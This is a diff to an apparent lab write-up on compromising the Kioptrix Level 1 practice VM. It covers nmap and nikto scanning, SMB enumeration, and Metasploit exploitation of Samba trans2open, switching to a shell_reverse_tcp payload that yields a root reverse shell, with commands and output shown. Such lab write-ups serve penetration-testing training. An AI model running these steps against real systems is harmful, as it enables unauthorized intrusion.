@@ -58,6 +58,9 @@ nmap -sn 192.168.126.0/24
 ```
 
 ### Results
+![scan_netdiscover](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scan_netdiscover.png)
+
+![scan_nmap_iprange](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scanning_nmap.png)
 
 After scanning the subnet, the target machine was identified with the following IP address:
 
@@ -75,9 +78,10 @@ After we have identified the IP for the victim machine, we head to Nmap again to
 nmap -sS -T4 -p- -A 192.168.126.129
 ```
 
-![scan_nmap_ports](placholder.png)
+
 
 ### Results
+![scanning_nmap_open_ports](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/scan_nmap.png)
 
 #### Scan Options
 
@@ -303,6 +307,7 @@ After identifying the available web services during the Nmap phase, the next ste
 ```bash
 nikto -h http://192.168.126.129
 ```
+![enum_http_nikto](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_http1.png)
 
 #### Target Information
 
@@ -562,24 +567,16 @@ During the initial Nmap reconnaissance, SMB services were identified on port **1
 #### Metasploit Module
 
 ```bash
+msfconsole
+search /scanner/smb/
 use auxiliary/scanner/smb/smb_version
-```
-
-### Configure Target
-
-```bash
 set RHOSTS 192.168.126.129
-```
-
-### Execute Scan
-
-```bash
 run
 ```
-
 ---
 
 ## Scan Results
+![enum_msf_smb_scan](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/msf_scan_smb.png)
 
 ### Output
 
@@ -656,6 +653,9 @@ After identifying **Samba 2.2.1a**, SMB shares were enumerated using the `smbcli
 ```bash
 smbclient -L //192.168.126.129/
 ```
+![enum_smbclient1](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient1.png)
+![enum_smbclient2](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient2.png)
+![enum_smbclient3](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/822c8831e5736c94d5e395847499ddc98bea3638/images/enum_smbclient3_ipc.png)
 
 ### Findings
 
@@ -722,7 +722,6 @@ The IPC$ share was successfully accessed using anonymous authentication.
 ### smbclient Assessment
 
 This enumeration confirms that the Samba server permits **null-session access** and exposes the **IPC$ share** without credentials. While ADMIN$ remains protected, anonymous access to IPC$ can often provide useful information during further SMB enumeration and reinforces the finding that the target is running a legacy Samba configuration with relaxed security controls.
-
 
 
 ---
@@ -848,7 +847,7 @@ Researching these versions revealed publicly documented vulnerabilities and expl
 
 The web server was found to be running:
 
-```text id="ek1w1n"
+```text
 Apache 1.3.20
 mod_ssl 2.8.4
 OpenSSL 0.9.6b
@@ -867,7 +866,7 @@ These resources describe vulnerabilities affecting legacy Apache/mod_ssl install
 
 SMB enumeration identified the target as:
 
-```text id="gcn8hy"
+```text
 Unix (Samba 2.2.1a)
 ```
 
@@ -882,3 +881,301 @@ This vulnerability affects older Samba releases and has historically been levera
 ---
 
 At this stage, both the **mod_ssl** and **Samba** attack surfaces appear viable candidates for exploitation. The following sections will evaluate each path individually, validate whether the target is vulnerable, and attempt to obtain an initial foothold on the system.
+
+## Exploiting Samba `trans2open`
+
+After identifying **Samba 2.2.1a** during the enumeration phase and confirming that a public Metasploit module existed for the `trans2open` vulnerability, the next step was to attempt exploitation.
+
+### Selecting the Exploit Module
+
+A search for available modules revealed multiple `trans2open` exploits for different operating systems:
+
+```bash
+search trans2open
+```
+
+The Linux-specific module was selected:
+
+```bash
+use exploit/linux/samba/trans2open
+```
+![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open2.png)
+![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open3.png)
+![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open4.png)
+
+
+
+The target was then configured:
+
+```bash
+set RHOSTS 192.168.126.129
+set LHOST 192.168.126.128
+set LPORT 54321
+```
+
+---
+
+## Initial Exploitation Attempt
+
+By default, Metasploit selected the following payload:
+
+```text
+linux/x86/meterpreter/reverse_tcp
+```
+
+The exploit was executed:
+
+```bash
+exploit
+```
+![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open5.png)
+
+#### Observations
+
+The module began brute-forcing return addresses:
+
+```text
+Trying return address 0xbffffdfc...
+Trying return address 0xbffffcfc...
+Trying return address 0xbffffbfc...
+```
+
+Eventually, a Meterpreter session appeared to be created:
+
+```text
+Meterpreter session 5 opened
+```
+
+However, the session immediately died:
+
+```text
+Meterpreter session 5 closed. Reason: Died
+Meterpreter session 6 closed. Reason: Died
+```
+
+After several attempts, the exploit was interrupted.
+
+---
+
+## Assessment of the Failure
+
+At first glance, this may appear to be a failed exploit attempt, but it actually provided extremely valuable information.
+
+### Important Observations
+
+1. The target accepted the exploit.
+2. The exploit reached code execution.
+3. A session was created, albeit briefly.
+4. The payload itself failed to execute reliably.
+
+This distinction is critical.
+
+The vulnerability was likely **successfully triggered**, but the chosen payload was incompatible with the target environment.
+
+---
+
+# Adapting the Approach
+
+A common mistake during penetration testing is assuming that a failed payload means the target is not vulnerable.
+
+Instead, we should ask:
+
+> "Did the exploit fail, or did the payload fail?"
+
+The dying Meterpreter sessions strongly suggested the latter.
+
+Considering the age of the target:
+
+* Linux Kernel 2.4.x
+* Samba 2.2.1a
+* Legacy userspace libraries
+
+it is not unusual for staged Meterpreter payloads to encounter compatibility issues.
+
+Therefore, instead of abandoning the exploit path, the payload strategy was adjusted.
+
+---
+
+## Switching to a Non-Staged Payload
+
+The payload was changed from:
+
+```text
+linux/x86/meterpreter/reverse_tcp
+```
+
+to:
+
+```text
+linux/x86/shell_reverse_tcp
+```
+
+Configuration:
+
+```bash
+set payload linux/x86/shell_reverse_tcp
+```
+
+The exploit was executed once again:
+
+```bash
+exploit
+```
+
+![](https://github.com/WNobsi/kioptrix.level1-using-Metaploit/blob/25b731beccbd3ef0d5f516a8ebf6a289a0c7d5ec/images/exploit_msf_trans2open6.png)
+
+---
+
+## Successful Exploitation
+
+This time, the exploit successfully established command shell sessions:
+
+```text
+Command shell session 7 opened
+Command shell session 8 opened
+Command shell session 9 opened
+Command shell session 10 opened
+```
+
+Verifying access:
+
+```bash
+whoami
+root
+hostname
+kioptrix.level1
+```
+
+Verifying with 'whoami' the user that we got access to is 'root', would mean we would need any privilege escalation and that the exploitation directly gives the root access of the machine.
+And 'hostname' output as 'kioptrixx.level1' would confirm we broke into the correct machine.
+
+The successful shell confirmed:
+
+| Property | Value                       |
+| -------- | --------------------------- |
+| User     | root                        |
+| Hostname | kioptrix.level1             |
+| Exploit  | Samba trans2open            |
+| Payload  | linux/x86/shell_reverse_tcp |
+| Result   | Remote Root Shell           |
+
+---
+
+# Pentester's Assessment
+
+This exploitation process highlights an important penetration testing mindset:
+
+> A failed payload does not necessarily mean a failed exploit.
+
+The initial Meterpreter sessions dying were actually a strong indicator that:
+
+* The vulnerability existed.
+* Code execution had likely been achieved.
+* The payload was incompatible with the target environment.
+
+Instead of abandoning the attack path, adapting to the target's age and constraints by switching to a simpler, non-staged payload ultimately resulted in successful remote code execution and an immediate **root shell**.
+
+This demonstrates one of the most important lessons in penetration testing:
+
+> **Enumeration provides direction, exploitation provides feedback, and adaptation turns partial success into full compromise.**
+
+# Key Takeaways - Step-by-Step Summary
+
+1. **Discovered the target host** on the local network and confirmed that it was alive.
+
+2. **Performed a full Nmap scan** and identified six open ports:
+
+   * 22 (SSH)
+   * 80 (HTTP)
+   * 111 (RPCBind)
+   * 139 (SMB)
+   * 443 (HTTPS)
+   * 32768 (RPC Status)
+
+3. **Identified multiple legacy services**, including:
+
+   * Apache 1.3.20
+   * mod_ssl 2.8.4
+   * OpenSSL 0.9.6b
+   * Samba 2.2.1a
+   * OpenSSH 2.9p2
+
+4. **Performed web enumeration using Nikto**, revealing:
+
+   * Outdated web stack
+   * TRACE method enabled
+   * Directory indexing enabled
+   * Accessible documentation and test files
+   * Historically vulnerable mod_ssl version
+
+5. **Performed SMB enumeration** using Metasploit and SMBClient, which revealed:
+
+   * Samba 2.2.1a
+   * Null-session access
+   * Hostname: `KIOPTRIX`
+   * Workgroup: `MYGROUP`
+   * Accessible `IPC$` share
+
+6. **Researched the discovered software versions** and identified publicly available exploits for:
+
+   * mod_ssl 2.8.4
+   * Samba `trans2open`
+
+7. **Selected the Samba `trans2open` vulnerability** as the first exploitation path due to:
+
+   * Matching version information
+   * Anonymous SMB access
+   * Reliable Metasploit module
+
+8. **Attempted exploitation using the default Meterpreter payload**, which resulted in sessions opening and immediately dying.
+
+9. **Adapted the approach by changing the payload** from:
+
+   * `linux/x86/meterpreter/reverse_tcp`
+
+   to:
+
+   * `linux/x86/shell_reverse_tcp`
+
+10. **Successfully obtained a remote root shell**, verifying:
+
+    * User: `root`
+    * Hostname: `kioptrix.level1`
+
+---
+
+# Overall Summary
+
+This write-up reinforced one of the most important principles in penetration testing:
+
+> **Enumeration drives exploitation.**
+
+Every piece of information gathered during reconnaissance contributed to making an informed decision later in the assessment. Rather than immediately attempting exploits, the process involved:
+
+* Identifying exposed services.
+* Understanding software versions.
+* Researching known vulnerabilities.
+* Prioritizing attack surfaces.
+* Validating assumptions through enumeration.
+
+Perhaps the biggest lesson learned was that:
+
+> **A failed payload does not necessarily mean a failed exploit.**
+
+When the initial Meterpreter payload repeatedly died, it would have been easy to conclude that the target was not vulnerable. Instead, analyzing the behavior of the exploit and adapting to the target's environment led to the realization that the vulnerability had likely been triggered successfully and that only the payload was failing.
+
+By switching to a simpler, non-staged payload, exploitation succeeded immediately.
+
+This write-up also helped develop several important penetration testing skills:
+
+* Conducting methodical reconnaissance.
+* Enumerating services instead of relying on assumptions.
+* Researching vulnerabilities based on version information.
+* Correlating findings across multiple services.
+* Troubleshooting failed exploitation attempts.
+* Adapting attack techniques to legacy environments.
+* Maintaining persistence when initial approaches fail.
+
+Most importantly, this machine demonstrated that penetration testing is rarely a straight path from scan to shell. Successful assessments often depend on patience, curiosity, and the ability to adapt when things do not work as expected.
+
+Completing this write-up not only resulted in obtaining a root shell on the target but also provided valuable experience in thinking like a penetration tester—using evidence gathered during enumeration to guide decisions, troubleshoot failures, and ultimately achieve successful compromise.
